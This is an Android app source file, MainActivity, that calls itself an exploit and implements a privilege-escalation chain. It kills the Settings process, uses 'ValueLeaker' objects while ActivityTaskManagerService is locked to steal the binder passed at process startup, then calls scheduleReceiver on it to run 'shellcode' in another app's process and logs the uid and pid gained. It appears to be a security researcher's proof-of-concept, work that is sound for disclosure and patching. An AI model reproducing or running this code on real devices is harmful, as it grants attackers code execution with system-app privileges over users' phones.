package com.example.leakvalue;

import android.app.ActivityManager;
import android.content.Intent;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.example.leakvalue.localtest.TestActivity;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    /**
     * Main exploit function, executed on background thread
     */
    void doAllStuff() {
        MiscUtils.allowHiddenApis();
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        ArrayList<ValueLeaker> leakers = new ArrayList<>();

        try {
            // Terminate Settings process
            MiscUtils.releaseAsyncProviders();
            MiscUtils.waitForReleaseAsyncProviders(this::log);

            activityManager.killBackgroundProcesses("com.android.settings");

            // Wait for ActivityManager to notice process death
            Thread.sleep(200);

            // Create ValueLeaker-s
            ValueLeakerMaker leakerMaker = new ValueLeakerMaker(this);
            leakerMaker.runWithNestLevels(5, i -> {
                try {
                    // As each ValueLeaker references MediaSession and ValueLeakerMaker has only one
                    // we need to use separate ValueLeakerMaker for each operation.
                    // Also, as leaker in this variant is at higher offset, we had to shrink size
                    leakers.add(new ValueLeakerMaker(this).makeHolderLeakerWithRewind(52));
                } catch (ReflectiveOperationException | RemoteException e) {
                    e.printStackTrace();
                }
            });
        } catch (InterruptedException | ReflectiveOperationException | RemoteException e) {
            throw new RuntimeException(e);
        }

        log("Created " + leakers.size() + " ValueLeaker-s");
        if (leakers.isEmpty()) {
            throw new RuntimeException("Leakers not created");
        }

        ArrayList<IBinder> leakedBinders = new ArrayList<>();
        log("Locking ActivityTaskManagerService");
        MiscUtils.withLockedActivityTaskManager(activityManager, () -> {
            log("Locked ActivityTaskManagerService");
            try {
                // Initiate process startup
                MiscUtils.acquireContentProviderAsync(this, "android.settings.slices");

                // Give launched app some time to call attachApplication
                Thread.sleep(300);

                // Grab Binder passed to attachApplication
                for (ValueLeaker leaker : leakers) {
                    Parcel parcel = leaker.doLeak();
                    if (parcel != null) {
                        parcel.setDataPosition(24);
                        IBinder binder = parcel.readStrongBinder();
                        if (binder != null && !(binder instanceof Binder)) {
                            leakedBinders.add(binder);
                        }
                    }
                }
                log("Unlocking ActivityTaskManagerService");
            } catch (ReflectiveOperationException | InterruptedException | RemoteException e) {
                throw new RuntimeException(e);
            }
        });
        log("Unlocked ActivityTaskManagerService");

        log("leakedBinders=" + leakedBinders);
        for (IBinder leakedBinder : leakedBinders) {
            try {
                String interfaceDescriptor = leakedBinder.getInterfaceDescriptor();
                log("Leaked interface: " + interfaceDescriptor);
            } catch (RemoteException e) {
                log("RemoteException while communicating with leaked Binder");
            }
        }

        if (!leakedBinders.isEmpty()) {
            try {
                Thread.sleep(200);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

            log("Requesting code execution");
            Intent intent = new Intent(this, ShellcodeReceiver.class);
            MiscUtils.putBinderExtra(intent, "a", new IShellcodeReporter.Stub() {
                @Override
                public void noteShellcodeExecuted(String packageName, String id) {
                    log("Shellcode has been executed in uid=" + Binder.getCallingUid() + " pid=" + Binder.getCallingPid() + " packageName=" + packageName);
                    log(id);
                }
            });
            for (IBinder leakedBinder : leakedBinders) {
                try {
                    MiscUtils.callScheduleReceiver(
                            leakedBinder,
                            getPackageName(),
                            getApplicationInfo().sourceDir,
                            intent
                    );
                } catch (ReflectiveOperationException e) {
                    e.printStackTrace();
                    log("Failed to call scheduleReceiver");
                }
            }
        }

        runOnUiThread(() -> {
            mStartButton.setEnabled(true);
        });
    }

    private View mStartButton;
    private TextView mTextView;
    private StringBuilder mTextBuilder;
    private Handler mHandler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mStartButton = findViewById(R.id.start_button);
        mTextView = findViewById(R.id.output_text);
        mTextBuilder = new StringBuilder();
        mHandler = new Handler();
    }

    @Override
    protected void onStop() {
        MiscUtils.releaseAsyncProviders();
        super.onStop();
    }

    void log(String message) {
        Log.i("MainActivity", message);
        if (Looper.myLooper() != mHandler.getLooper()) {
            mHandler.post(() -> logInner(message));
        } else {
            logInner(message);
        }
    }

    private void logInner(String message) {
        mTextBuilder.append(message).append("\n");
        mTextView.setText(mTextBuilder.toString());
    }

    public void startAllStuff(View view) {
        mStartButton.setEnabled(false);
        new Thread(this::doAllStuff).start();
    }

    public void doOpenManualTesting(View view) {
        startActivity(new Intent(this, TestActivity.class));
    }
}
